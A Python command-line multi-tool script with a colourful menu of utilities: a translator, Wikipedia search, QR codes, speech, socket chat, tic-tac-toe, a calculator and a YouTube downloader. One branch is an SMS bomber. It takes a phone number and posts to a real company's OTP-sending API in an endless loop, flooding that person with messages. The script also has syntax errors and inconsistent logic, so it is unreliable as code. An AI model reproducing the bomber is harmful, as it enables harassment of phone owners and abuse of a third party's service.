from rich import print as pr
import socket
import threading
import cowsay
import os
import requests
import time
from random import randint
from colorama import Fore
import qrcode
import wikipedia
#--------------------------------------------------------------------------------------
pr("[yellow]""WELCOME TO BNG!""[/yellow]")
pr("""[green]
░██████╗░█████╗░██╗░░░░░███████╗██╗░░██╗  ██████╗░███╗░░██╗░██████╗░
██╔════╝██╔══██╗██║░░░░░██╔════╝██║░░██║  ██╔══██╗████╗░██║██╔════╝░
╚█████╗░███████║██║░░░░░█████╗░░███████║  ██████╦╝██╔██╗██║██║░░██╗░
░╚═══██╗██╔══██║██║░░░░░██╔══╝░░██╔══██║  ██╔══██╗██║╚████║██║░░╚██╗
██████╔╝██║░░██║███████╗███████╗██║░░██║  ██████╦╝██║░╚███║╚██████╔╝
╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝  ╚═════╝░╚═╝░░╚══╝░╚═════╝░[/green]\n""")
pr("[yellow]""-------------------------------------------------------------------------------------------------------------""[/yellow]")
pr("\n[blue]""Made by Saleh[/blue]\n[magenta]telegram : [red] @SalehBNG0 [/red][/magenta]\n\n[cyan]print the meno ----->[/cyan][red](meno)[/red]""")
pr("[yellow]""-------------------------------------------------------------------------------------------------------------""[/yellow]")
pr("""[red]_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
"[magenta]hello welcome to BNG project . . . . . [/magenta]")
"[yellow][1] : go to list maker :[white](l)[/white] harbar bekhai ezafe koni l ro benevis[/yellow]")
"[2] : [blue]go to wikipedia search: [white](w)[/white] [/blue]")
"[cyan][3] : go to qrcode maker :[white](q)[/white]")
"[4] : go to text to speech :[white](p)[/white][/cyan]")
"[green][5] : play game rock paper scissor: [white](s)[/white]")
"[6] : go to translator (translate) type :[white](t)[/white][/green]")
"[magenta][7] : go to note and read the file : [white](y)[/white][/magenta]"
"[blue][8] : taking a screenshot : [white](m)[/white][/blue]
"[magenta][9] : go to smsboomber(corrupt) [/magenta] [white](sms)[/white]
"[blue][10] : create chat server : [white](create server) , join to server(join server)[/white][/blue]
[green][11] : go to voice chat [white](voice chat)[/white][/green]
[cyan][12] : game doz online with friend[/cyan][white](doz)[/white]
[magenta][13] : go to Calculator gui (graphics)[/magenta] [white](c)[/white]
[green][14] : go to YouTube downloader [/green][white] (youtube)[/white])
[blue][15] : go to sound to text ! [white](sound)[/white]
[magenta][16] : go to Go to convert text to image AI[/magenta] [white](ai)[/white]   
[cyan][17] : go to Voice recorder[white](voice)[/white][/cyan]
[green][18] : go to screen recorder[white](screen)[/white]
"[red][19] : exit : [white](exit)[/white][yellow]for all !!!!![/yellow] ")
"_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_[/red]")""")

p = []
while True:
    ppp = input("> ")


    if ppp == "t":
        while True:
            try:
                from translate import Translator
                pr("[magenta]""exit -----> [green](a)[/green][red] no message is printed but it comes out)[/red]""[/magenta]")
                user = input("english to persian (e) persian to english (d)\n")
                if user == "a":
                    break
            except:
                print("in the android not ssuported or unknow error")

            elif user == "e":
                try:
                    lll = input("write something . .\n")
                    options = Translator(from_lang="en", to_lang="persian")
                    translate = options.translate(lll)
                    pr(f"""[magenta]---------------------------
                    {translate}
             ---------------------------[/magenta]""")
                    pr("[red]""if you use CMD copy the text and paste it somewhere!!!""[/red]")
                    pr("[green]---------------------------------[/green]")
                except:
                    pr("[yellow]""There is a problem with the internet""[/yellow]")
                if user == "a":
                    break
            elif user == "d":
                try:
                    kkk = input("write something . .\n")
                    options = Translator(from_lang="persian", to_lang="en")
                    translate = options.translate(kkk)
                    print("---------------------------")
                    pr("[yellow]"f"(: {translate}""[/yellow]")
                    print("---------------------------")
                except:
                    pr("[yellow]""There is a problem with the internet""[/yellow]")

#----------------------------------------------------------------------------
    elif ppp == "ai":
        import requests
        import random
        try:
            pr("[blue]""Write the picture you want to be made for you""[/blue]")
            prompt = input("")

            w = input("width [1080]:") or 1080
            n = input("height [1080]:") or 1080

            seed = random.randint(1, 1000)

            base = "https://image.pollinations.ai/prompt"
            url = f"{base}/{prompt}??seed={seed}&width={w}&height={n}"

            res = requests.get(url)

            with open("pic.jpg", "wb") as f:
                f.write(res.content)
            pr("[green]""save shod mashti. . . . . . . . .""[/green]")
        except:
            pr("[red]""no net mashti(no connection)""[/red]")
    #-----------------------------------------------------------------------------
    elif ppp == "l":
        pr("[yellow]""enter your iteam""[/yellow]")
        list2 = input("\n")
        p.append(list2)
        pr("[yellow]"f"{p}""[/yellow]")
#-----------------------------------------------------------------------------
    elif ppp == "meno":
        pr("""[red]_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
        "[magenta]hello welcome to BNG project . . . . . [/magenta]")
        "[yellow][1] : go to list maker :[white](l)[/white] harbar bekhai ezafe koni l ro benevis[/yellow]")
        "[2] : [blue]go to wikipedia search: [white](w)[/white] [/blue]")
        "[cyan][3] : go to qrcode maker :[white](q)[/white]")
        "[4] : go to text to speech :[white](p)[/white][/cyan]")
        "[green][5] : play game rock paper scissor: [white](s)[/white]")
        "[6] : go to translator (translate) type :[white](t)[/white][/green]")
        "[magenta][7] : go to note and read the file : [white](y)[/white][/magenta]"
        "[blue][8] : taking a screenshot : [white](m)[/white][/blue]
        "[magenta][9] : go to smsboomber(corrupt) [/magenta] [white](sms)[/white]
        "[blue][10] : create chat server : [white](create server) , join to server(join server)[/white][/blue]
        [green][11] : go to voice chat [white](voice chat)[/white][/green]
        [cyan][12] : game doz online with friend[/cyan][white](doz)[/white]
        [magenta][13] : go to Calculator gui (graphics)[/magenta] [white](c)[/white]
        [green][14] : go to YouTube downloader [/green][white] (youtube)[/white])
        [blue][15] : go to sound to text ! [white](sound)[/white]
        [magenta][16] : go to Go to convert text to image AI[/magenta] [white](ai)[/white]   
        [cyan][17] : go to Voice recorder[white](voice)[/white][/cyan]
        [green][18] : go to screen recorder[white](screen)[/white]
        "[red][19] : exit : [white](exit)[/white][yellow]for all !!!!![/yellow] ")
        "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_[/red]")""")
#-----------------------------------------------------------------------------
    if ppp == "y":
        pr("[red]"" read file : (o) [cyan] go to notes (y)[/cyan]""[/red]")
        op = input(">>> ")
        if op == "o":
            name = input("name file???")
            pr("[blue]""-----------------------------------------------""[/blue]")
            pl = open(name)
            print(pl.read())
            pr("[blue]""-----------------------------------------------""[/blue]")
        elif op == "y":
            pr("[green]""welcome to notes""[/green]\n[red]cgizi benevisid[/red]")
            file = input("")
            pr("""name file + .txt or .py or . . . .""")
            o = input("")
            file1 = open(o, "w")
            file1.write(file)
            file1.close()

            pr("[green]""save . . . . . .[/green] [red]\n read file (o) exit--------->(x)""[/red]")
            bb = input("")
            if bb == "x":
                break

            elif bb == "o":
                name = input("name file???\n")
                pr("[blue]""-----------------------------------------------""[/blue]")
                pl = open(name)
                print(pl.read())
                pr("[blue]""-----------------------------------------------""[/blue]")
#--------------------------------------------------------------------------------
    elif ppp == "sound":
        import speech_recognition as sr
        import pyttsx3
        # create a recognizer object
        r = sr.Recognizer()
        while True:
            # use the microphone as the audio source
            with sr.Microphone() as source:
                print("exit speak exit\n")
                print("Speak something:")


                # record the audio
                audio = r.listen(source)


                try:
                    # using google speech recognition
                    pr("[yellow]""You said: ""[/yellow]" + r.recognize_google(audio))
                    if r.recognize_google(audio).lower() == "exit":
                        break
                    pyttsx3.speak("you said: " + r.recognize_google(audio))
                except sr.UnknownValueError:
                    print("Google Speech Recognition could not understand audio")
                except sr.RequestError as e:
                    print("Could not request results from Google Speech Recognition service; {0}".format(e))
#---------------------------------------------------------------------------------
    elif ppp == "sms":
        print("""
          ____  _   _  _____   ____   ____   ____  __  __ ____  
         |  _ \| \ | |/ ____| |  _ \ / __ \ / __ \|  \/  |  _ \ 
         | |_) |  \| | |  __  | |_) | |  | | |  | | \  / | |_) |
         |  _ <| . ` | | |_ | |  _ <| |  | | |  | | |\/| |  _ < 
         | |_) | |\  | |__| | | |_) | |__| | |__| | |  | | |_) |
         |____/|_| \_|\_____| |____/ \____/ \____/|_|  |_|____/ 
                                                                
                                                                
        """)
        pr("[red]""Is broken""[/red]")
        url ='https://api.lendo.ir/api/customer/auth/send-otp'
        pr("[green]""enter number: ""[/green]")
        number = input("")
        p = 0
        while True:
            for num in range(1,1000):
                requests.post(url , data={"cellphone": number})
                pr("[red]"f"send {p}""[/red]")
                p += 1

#----------------------------------------------------------------------------------------------------

#-----------------------------------------------------------------------------------------------------
    elif ppp == "youtube":
        from pytube import YouTube


        def download_youtube_video(url, download_folder=""):
            """
            Download a YouTube video using pytube.

            :param url: YouTube video URL
            :param download_folder: Folder to save the video. Default is the current working directory.
            :return: None
            """
            try:
                yt = YouTube(url)
                video = yt.streams.get_highest_resolution()

                # Print video information
                print(f"Title: {yt.title}")
                print(f"Author: {yt.author}")
                print(f"Duration: {yt.length} seconds")

                # Download the video
                print("Downloading video...")
                video.download(download_folder)
                pr("[green]""save . . . .""[/green]")
                print("Video downloaded successfully.")

            except Exception as e:
                print(f"An error occurred: {e}")

        pr("[cyan]""enter you url""[/cyan]")
        # Usage
        url = input("")  # YouTube video URL
        download_folder = "downloads"  # Folder to save the video


        download_youtube_video(url, download_folder)
#----------------------------------------------------------------------------------------------------
    elif ppp == "voice":
        import sounddevice as sd
        import soundfile as sf
        fs = 44100
        duration = int(input("Record the sound for a few seconds????"))

        audio = sd.rec(int(fs * duration), samplerate=fs, channels=1)
        sd.wait()
        sf.write('BNG.wav', audio, fs)
        pr("[cyan]""Recording save . . . .""[/cyan]")
#----------------------------------------------------------------------------------------------------
    elif ppp == "doz":
        pr("[yellow]""WELCOME TO BNG DOZ""[/yellow]")
        pr("[blue]""create server for game [white](c)[/white]\n join server [white](j)[/white]""[/blue]")
        i = input("")
        if i == "c":
            import socket
            import threading


            class TicTacToe:
                def __init__(self):
                    self.board = [[" " for _ in range(3)] for _ in range(3)]
                    self.turn = "X"
                    self.you = "X"
                    self.opponent = "O"
                    self.winner = None
                    self.game_over = False

                    self.counter = 0

                def host_game(self, host, port):
                    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    server.bind((host, port))
                    server.listen(1)

                    client, addr = server.accept()

                    self.you = "X"
                    self.opponent = "O"
                    threading.Thread(target=self.handle_connection, args=(client,)).start()
                    server.close()

                def connect_to_game(self, host, port):
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    client.connect((host, port))

                    self.you = 'O'
                    self.opponent = 'X'
                    threading.Thread(target=self.handle_connection, args=(client,)).start()

                def handle_connection(self, client):
                    while not self.game_over:
                        if self.turn == self.you:
                            move = input("enter a move (row,column):")
                            if self.check_valid_move(move.split(',')):
                                self.apply_move(move.split(','), self.you)
                                self.turn = self.opponent
                                client.send(move.encode('utf-8'))
                            else:
                                print("invalid move!")

                        else:
                            data = client.recv(1024)
                            if not data:
                                client.close()
                                break
                            else:
                                self.apply_move(data.decode('utf-8').split(','), self.opponent)
                                self.turn = self.you

                    client.close()

                def apply_move(self, move, player):
                    if self.game_over:
                        return
                    self.counter += 1
                    row, col = int(move[0]), int(move[1])
                    if 0 <= row < 3 and 0 <= col < 3 and self.board[row][col] == " ":
                        self.board[row][col] = player
                        self.print_board()
                        if self.check_if_won():
                            if self.winner == self.you:
                                print(f"{self.you} wins!")
                            elif self.winner == self.opponent:
                                print(f"{self.opponent} wins!")
                            self.game_over = True

                        elif self.counter == 9:
                            print("It's a tie!")
                            self.game_over = True

                def check_valid_move(self, move):
                    if len(move) == 2 and move[0].isdigit() and move[1].isdigit():
                        row, col = int(move[0]), int(move[1])
                        return 0 <= row < 3 and 0 <= col < 3 and self.board[row][col] == " "
                    return False

                def check_if_won(self):
                    for row in range(3):
                        if self.board[row][0] == self.board[row][1] == self.board[row][2] != " ":
                            self.winner = self.board[row][0]
                            return True
                    for col in range(3):
                        if self.board[0][col] == self.board[1][col] == self.board[2][col] != " ":
                            self.winner = self.board[0][col]
                            return True
                    if self.board[0][0] == self.board[1][1] == self.board[2][2] != " ":
                        self.winner = self.board[0][0]
                        return True
                    if self.board[0][2] == self.board[1][1] == self.board[2][0] != " ":
                        self.winner = self.board[0][2]
                        return True
                    return False

                def print_board(self):
                    for row in range(3):
                        print(" | ".join(self.board[row]))
                        if row != 2:
                            print("--------------")


            game = TicTacToe()
            game.host_game(input("enter ip ..."), int(input("enter ip (5555 or 5445 or 6666 or 9999)")))
#----------------------------------------------------------------------------------------------------
        elif i == "j":
            import socket
            import threading


            class TicTacToe:

                def __init__(self):
                    self.board = [[" ", " ", " "], [" ", " ", " "], [" ", " ", " "]]
                    self.turn = "X"
                    self.you = "X"
                    self.opponent = "O"
                    self.winner = None
                    self.game_over = False

                    self.counter = 0

                def host_game(self, host, port):
                    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    server.bind((host, port))
                    server.listen(1)

                    client, addr = server.accept()

                    self.you = "X"
                    self.opponent = "O"
                    threading.Thread(target=self.handle_connection, args=(client,)).start()
                    server.close()

                def connect_to_game(self, host, port):
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    client.connect((host, port))

                    self.you = 'O'
                    self.opponent = 'X'
                    threading.Thread(target=self.handle_connection, args=(client,)).start()

                def handle_connection(self, client):
                    while not self.game_over:
                        if self.turn == self.you:
                            move = input("enter a move (row,column):")
                            if self.check_valid_move(move.split(',')):
                                self.apply_move(move.split(','), self.you)
                                self.turn = self.opponent
                                client.send(move.encode('utf-8'))
                            else:
                                print("invalid move !(ridi)")

                        else:
                            data = client.recv(1024)
                            if not data:
                                client.close()
                                break
                            else:
                                self.apply_move(data.decode('utf-8').split(','), self.opponent)
                                self.turn = self.you
                    client.close()

                def apply_move(self, move, player):
                    if self.game_over:
                        return
                    self.counter += 1
                    self.board[int(move[0])][int(move[1])] = player
                    self.print_board()
                    if self.check_if_won():
                        if self.winner == self.you:
                            print("you win !")
                            exit()
                        elif self.winner == self.opponent:
                            print("you lose !")
                            exit()
                    else:
                        if self.counter == 9:
                            print(" it is a tie!")
                            exit()

                def check_valid_move(self, move):
                    return self.board[int(move[0])][int(move[1])] == " "

                def check_if_won(self):
                    for row in range(3):
                        if self.board[row][0] == self.board[row][1] == self.board[row][2] != " ":
                            self.winner = self.board[row][0]
                            self.game_over = True
                            return True
                    for col in range(3):
                        if self.board[0][col] == self.board[1][col] == self.board[2][col] != " ":
                            self.winner = self.board[0][col]
                            self.game_over = True
                            return True
                    if self.board[0][0] == self.board[1][1] == self.board[1][1] == self.board[2][2] != " ":
                        self.winner = self.board[0][0]
                        self.game_over = True
                        return True
                    if self.board[0][2] == self.board[1][1] == self.board[2][0] != " ":
                        self.winner = self.board[0][2]
                        self.game_over = True
                        return True
                    return False

                def print_board(self):
                    for row in range(3):
                        print(" | ".join(self.board[row]))
                        if row != 2:
                            print("--------------")


            game = TicTacToe()
            game.connect_to_game(input("enter ip :\n"), int(input("enter port \n")))
            pr("[green]""waiting for player move""[/green]")
#----------------------------------------------------------------------------------------------------
    elif ppp == "voice chat":
        pr("[yellow]"" welcome to voice chat BNG!""[/yellow]")
        pr("[cyan]""create voice chat [white](c)[/white]""[/cyan]")
        pr("[blue]""join voice chat [white](j)[/white]""[/blue]")
        p = input("")
        if p == "c":
            from vidstream import AudioSender
            from vidstream import AudioReceiver

            import threading
            import socket

            # ip = socket.gethostbyname(socket.gethostname())

            receiver = AudioReceiver(input("enter ip (Go to CMD and write ipconfig and enter ipv4 address)"), int(input("enter port(4554 or 9999 or 5555 . . . )")))
            receive_thread = threading.Thread(target=receiver.start_server)
            pr("[red]""waiting for user""[/red]")

            # sender = AudioSender("192.168.1.104" , 9999)
            # sender_thread = threading.Thread(target=sender.start_stream)

            receive_thread.start()
            # sender_thread.start()
#----------------------------------------------------------------------------------------------------
    elif ppp == "screen":
        import cv2
        import time
        import moviepy.editor as mpy
        import tkinter as tk
        import numpy as np
        from PIL import Image
        import pyautogui

        class ScreenRecorder:
            def __init__(self, master):
                self.master = master
                self.recording = False
                self.button = tk.Button(self.master, text="Start Recording", command=self.start_stop_recording)
                self.button.pack()

            def start_stop_recording(self):
                if not self.recording:
                    self.button.config(text="Stop Recording")
                    self.recording = True
                    self.start_time = time.time()
                    self.recorder = mpy.VideoClip(
                        lambda t: np.array(Image.frombytes('RGB', pyautogui.size(), pyautogui.screenshot().tobytes())),
                        duration=10)
                else:
                    self.button.config(text="Start Recording")
                    self.recording = False
                    end_time = time.time()
                    duration = end_time - self.start_time
                    pr("[yellow]"f"Recording duration: {duration} seconds""[/yellow]")
                    try:
                        self.recorder.write_videofile(f"recording_{duration}.mp4", fps=40)
                    except Exception as e:
                        pr("[red]"f"Error: {e}""[/red]")

        root = tk.Tk()
        root.title("BNG.recording")
        my_screen_recorder = ScreenRecorder(root)
        root.mainloop()
#-----------------------------------------------------------------------------------------------------
    elif p == "j":
        try:
            from vidstream import AudioSender
            from vidstream import AudioReceiver

            import threading
            import socket

            print("wait for connection")
            ip = socket.gethostbyname(socket.gethostname())

            sender = AudioSender(input("enter ip "), int(input("enter port")))
            sender_thread = threading.Thread(target=sender.start_stream)
            sender_thread.start()
        except:
            pr("[red]""There is a problem""[/red]")
#----------------------------------------------------------------------------------------------------
    elif ppp == "create server":
            import socket
            import threading

            SERVER = input("ip server ro bezan :(bro cmd benevis (ipconfig) eono inga vared kon)\n")
            PORT = int(input("port server bezan mesal:(5555 or 4545) faghat number\n"))
            ADDR = (SERVER, PORT)
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind(ADDR)

            clients = []
            nicknames = []


            def broadcast(message):
                for client in clients:
                    client.send(message)


            def handle(client):
                while True:
                    try:
                        msg = client.recv(1024)
                        broadcast(msg)
                    except:
                        index = clients.index(client)
                        clients.remove(client)
                        client.close()
                        nickname = nicknames[index]
                        nicknames.remove(nickname)
                        broadcast(f"{nickname} left the chat!".encode("utf-8"))

                        break


            def receive():
                while True:
                    client, addr = server.accept()
                    pr("[cyan]"f"Connected with {str(addr)}""[/cyan]")
                    client.send("NICK".encode("utf-8"))
                    nickname = client.recv(1024).decode("utf-8")
                    nicknames.append(nickname)
                    clients.append(client)

                    pr("[green]"f"Nickname of client is {nickname}!""[/green]")

                    broadcast(f"{nickname} Joined the chat!".encode("utf-8"))
                    client.send("Connected to the server!".encode("utf-8"))


                    thread = threading.Thread(target=handle, args=(client,))
                    thread.start()


            pr("[blue]""Server started...""[/blue]")
            server.listen()
            receive()
# ---------------------------------------------------------------------------------------------------

    elif ppp == "join server":
        ok = input("chat barat che rangi bashe? [ red , green , magenta , cyan]")
        if ok == "red":

            pr("[red]""welcome ....""[/red]")
            SERVER = input("Enter your ip  \n")
            PORT = int(input("Enter your port(5555)\n"))
            ADDR = (SERVER, PORT)
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(ADDR)
            def receive():
                while True:
                    try:
                        message = client.recv(1024).decode("utf-8")
                        if message == "BNG":
                            client.send(input("Enter your name:").encode("utf-8"))
                        else:
                            pr("[red]"f"{message}""[/red]")
                    except:
                        pr("[red]""Error occurred!""[/red]")
                        client.close()
                        break
            def write():
                while True:
                    message = f"{nickname}: {input('')}"
                    client.send(message.encode("utf-8"))


            pr("[green]""Client started...""[/green]")
            nickname = input("Enter your name")

            receive_thread = threading.Thread(target=receive)
            receive_thread.start()

            write_thread = threading.Thread(target=write)
            write_thread.start()
#---------------------------------------------------------------------------------------------------
        elif ok == "green":
            # Client configuration
            SERVER = input("Enter your ip  \n")
            PORT = int(input("Enter your port(5555)\n"))
            ADDR = (SERVER, PORT)
            # Client socket creation
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(ADDR)


            def receive():
                while True:
                    try:
                        message = client.recv(1024).decode("utf-8")
                        if message == "NICK":
                            client.send(input("Enter your name:").encode("utf-8"))
                        else:
                            pr("[green]"f"{message}""[/green]")
                    except:
                        pr("[red]""Error occurred!""[/red]")
                        client.close()
                        break


            def write():
                while True:
                    message = f"{nickname}: {input('')}"
                    client.send(message.encode("utf-8"))


            pr("[green]""Client started...""[/green]")
            nickname = input("Enter your name")

            receive_thread = threading.Thread(target=receive)
            receive_thread.start()

            write_thread = threading.Thread(target=write)
            write_thread.start()

#----------------------------------------------------------------------------------------------------
        elif ok == "cyan":
            # Client configuration
            SERVER = input("Enter your ip  \n")
            PORT = int(input("Enter your port(5555)\n"))
            ADDR = (SERVER, PORT)
            # Client socket creation
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(ADDR)


            def receive():
                while True:
                    try:
                        message = client.recv(1024).decode("utf-8")
                        if message == "NICK":
                            client.send(input("Enter your name:").encode("utf-8"))
                        else:
                            pr("[cyan]"f"{message}""[/cyan]")
                    except:
                        pr("[red]""Error occurred!""[/red")
                        client.close()
                        break


            def write():
                while True:
                    message = f"{nickname}: {input('')}"
                    client.send(message.encode("utf-8"))


            pr("[green]""Client started...""[/green]")
            nickname = input("Enter your name")

            receive_thread = threading.Thread(target=receive)
            receive_thread.start()

            write_thread = threading.Thread(target=write)
            write_thread.start()

#-----------------------------------------------------------------------------------------------------
        elif ok == "magenta":
            # Client configuration
            SERVER = input("Enter your ip  \n")
            PORT = int(input("Enter your port(5555)\n"))
            ADDR = (SERVER, PORT)
            # Client socket creation
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(ADDR)


            def receive():
                while True:
                    try:
                        message = client.recv(1024).decode("utf-8")
                        if message == "NICK":
                            client.send(input("Enter your name:").encode("utf-8"))
                        else:
                            pr("[magenta]"f"{message}""[/magenta]")
                    except:
                        pr("[red]""Error occurred!""[/red]")
                        client.close()
                        break

            def write():
                while True:
                    message = f"{nickname}: {input('')}"
                    client.send(message.encode("utf-8"))


            pr("[green]""Client started...""[/green]")
            nickname = input("Enter your name")

            receive_thread = threading.Thread(target=receive)
            receive_thread.start()

            write_thread = threading.Thread(target=write)
            write_thread.start()

#-----------------------------------------------------------------------------------------------------
    elif ppp == "c":
        import tkinter as tk
        import operator

        caluculation = ""


        def add_to_caluculation(symbol):
            global caluculation
            caluculation += str(symbol)
            text_result.delete(1.0, "end")
            text_result.insert(1.0, caluculation)


        def evaluate_caluculation():
            global caluculation
            try:
                result = eval_expression(caluculation)
                caluculation = str(result)
                text_result.delete(1.0, "end")
                text_result.insert(1.0, caluculation)
            except Exception as e:
                clear_field()
                text_result.insert(1.0, "Error")


        def clear_field():
            global caluculation
            caluculation = ""
            text_result.delete(1.0, "end")


        def eval_expression(expression):
            def apply_operator(operators, values):
                operator = operators.pop()
                right = values.pop()
                left = values.pop()
                if operator == '+':
                    values.append(left + right)
                elif operator == '-':
                    values.append(left - right)
                elif operator == '*':
                    values.append(left * right)
                elif operator == '/':
                    values.append(left / right)

            operators = []
            values = []
            i = 0
            while i < len(expression):
                if expression[i] == ' ':
                    i += 1
                    continue
                if expression[i] in '0123456789':
                    j = i
                    while j < len(expression) and expression[j] in '0123456789':
                        j += 1
                    values.append(int(expression[i:j]))
                    i = j
                elif expression[i] in "+-*/":
                    while (operators and operators[-1] != '(' and
                           precedence(operators[-1]) >= precedence(expression[i])):
                        apply_operator(operators, values)
                    operators.append(expression[i])
                    i += 1
                elif expression[i] == '(':
                    operators.append(expression[i])
                    i += 1
                elif expression[i] == ')':
                    while operators[-1] != '(':
                        apply_operator(operators, values)
                    operators.pop()
                    i += 1
            while operators:
                apply_operator(operators, values)
            return values[-1]


        def precedence(op):
            if op == '+' or op == '-':
                return 1
            if op == '*' or op == '/':
                return 2
            return 0


        root = tk.Tk()
        root.geometry("300x275")
        root.title("BNG Calculator")

        text_result = tk.Text(root, height=2, width=16, font=("Arial", 24))
        text_result.grid(columnspan=5, rowspan=2)

        btn_1 = tk.Button(root, text="1", command=lambda: add_to_caluculation(1), width=5, font=("Arial", 14))
        btn_1.grid(row=2, column=1)
        btn_2 = tk.Button(root, text="2", command=lambda: add_to_caluculation(2), width=5, font=("Arial", 14))
        btn_2.grid(row=2, column=2)
        btn_3 = tk.Button(root, text="3", command=lambda: add_to_caluculation(3), width=5, font=("Arial", 14))
        btn_3.grid(row=2, column=3)
        btn_4 = tk.Button(root, text="4", command=lambda: add_to_caluculation(4), width=5, font=("Arial", 14))
        btn_4.grid(row=3, column=1)
        btn_5 = tk.Button(root, text="5", command=lambda: add_to_caluculation(5), width=5, font=("Arial", 14))
        btn_5.grid(row=3, column=2)
        btn_6 = tk.Button(root, text="6", command=lambda: add_to_caluculation(6), width=5, font=("Arial", 14))
        btn_6.grid(row=3, column=3)
        btn_7 = tk.Button(root, text="7", command=lambda: add_to_caluculation(7), width=5, font=("Arial", 14))
        btn_7.grid(row=4, column=1)
        btn_8 = tk.Button(root, text="8", command=lambda: add_to_caluculation(8), width=5, font=("Arial", 14))
        btn_8.grid(row=4, column=2)
        btn_9 = tk.Button(root, text="9", command=lambda: add_to_caluculation(9), width=5, font=("Arial", 14))
        btn_9.grid(row=4, column=3)
        btn_0 = tk.Button(root, text="0", command=lambda: add_to_caluculation(0), width=5, font=("Arial", 14))
        btn_0.grid(row=5, column=2)

        btn_plus = tk.Button(root, text="+", command=lambda: add_to_caluculation("+"), width=5, font=("Arial", 14))
        btn_plus.grid(row=2, column=4)
        btn_minus = tk.Button(root, text="-", command=lambda: add_to_caluculation("-"), width=5, font=("Arial", 14))
        btn_minus.grid(row=3, column=4)
        btn_mul = tk.Button(root, text="*", command=lambda: add_to_caluculation("*"), width=5, font=("Arial", 14))
        btn_mul.grid(row=4, column=4)
        btn_div = tk.Button(root, text="/", command=lambda: add_to_caluculation("/"), width=5, font=("Arial", 14))
        btn_div.grid(row=5, column=4)
        btn_open = tk.Button(root, text="(", command=lambda: add_to_caluculation("("), width=5, font=("Arial", 14))
        btn_open.grid(row=5, column=1)
        btn_close = tk.Button(root, text=")", command=lambda: add_to_caluculation(")"), width=5, font=("Arial", 14))
        btn_close.grid(row=5, column=3)
        btn_clear = tk.Button(root, text="C", command=clear_field, width=11, font=("Arial", 14))
        btn_clear.grid(row=6, column=1, columnspan=2)
        btn_equals = tk.Button(root, text="=", command=evaluate_caluculation, width=11, font=("Arial", 14))
        btn_equals.grid(row=6, column=3, columnspan=2)
        root.mainloop()
#-----------------------------------------------------------------------------------------------------


    elif ppp == "q":
        pr("[blue]""enter your url""[/blue]")
        img = qrcode.make(input("\n"))
        p = ".png"
        i = input("enter name your photo\n")
        img.save(f"{i}{p}")
        pr("[green]""save . . . check your gallery or Desktop""[/green]")
        print( "_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-")
# ---------------------------------------------------------------------------
    elif ppp == "w":
        try:
            pr("[green]""write something. . . .""[/green]")
            d = wikipedia.summary(input("\n") , sentences=input("chand gomleh bashe? max = 10 or 15\n"))
            pr(f"""[cyan]--------------------------------------------
            {d}
            --------------------------------------------[/cyan]""")
        except:
            pr("""[red]error!(Because of obscene words or something like that, it's not on Wikipedia)[/red]""")
# ---------------------------------------------------------------------------
    elif ppp == "p":
        import pyttsx3
        pr("[yellow]""write something . . . ""[/yellow]")
        try:
            t = input("")
            pyttsx3.speak(t)
            pr("[blue]""----------------------------------------""[/blue]")
        except:
            pr("[yellow]""please say something in english!""[/yellow]")

    elif ppp == "q" or ppp == "exit":
        break
#---------------------------------------------------------------------------
    if ppp == "m":
        import pyautogui
        try:
            r = time.sleep(int(input("Take a screenshot for a few seconds??? exit(exit)")))
            pr("[blue]""waiting""[/blue]")
            i = pyautogui.screenshot()
            p = ".png"
            o = str(input(f"enter name file"))
            i.save(f"{o}{p}")
            pr("[green]""save . . . ..  . .. . . ""[/green]")
        except:
            pr("[red]""in the android not supported""[/red]")
#---------------------------------------------------------------------------
    elif ppp == "s":

        pr("[yellow]""How many hands do you play?[/yellow]|[red](Bring the same amount of points!!!)|""[/red]")
        k = int(input(""))
        pr("[yellow]""Just the number""[/yellow]")
        score = 0
        score2 = 0
        while score < k and k > score2:

            pr("baray kheroj benevis (exit) ya (khrog)")
            pr("[blue]""rock\n paper\n  scissors\n""[/blue]")
            print("---------------------------------------")
            computer = "rock"
            randomnumber = randint(1, 3)
            if randomnumber == 1:
                computer = "rock"
            elif randomnumber == 2:
                computer = "paper"
            elif randomnumber == 3:
                computer = "scissors"

            io = input("do the moves : \n")
            if io == "exit" or io == "q":
                break
            pr("[blue]"f"computer move : {computer}""[/blue]")
            if computer == io:
                pr("[red]""draw.....""[/red]")

            elif io == "rock" and computer == "paper":
                pr("[red]""computer win . . .""[/red]")
                score2 += 1
            elif io == "rock" and computer == "scissors":
                pr("[green]""you win . . .""[/green]")
                score += 1

            elif io == "paper" and computer == "rock":
                pr("[green]""you win . . .""[/green]")
                score += 1

            elif io == "paper" and computer == "scissors":
                pr("[red]""computer win . . .""[/red]")
                score2 += 1

            elif io == "paper" and computer == "rock":
                pr("[red]""computer win . . .""[/red]")
                score2 += 1

            elif io == "scissors" and computer == "paper":
                pr("[green]""you win . . .""[/green]")
                score += 1
            pr("[cyan]"f"score player: {score} [white]and[/white] computer : {score2}\n""[/cyan]")

        if score > score2:
            cowsay.turtle(pr("[green]""you win . . . . . . . .""[/green]"))
        elif score < score2:
            pr("[yellow]""end game : computer win . . . . .!!!!!""[/yellow]")
        pr("[blue]""restart game : (s)""[/blue]")
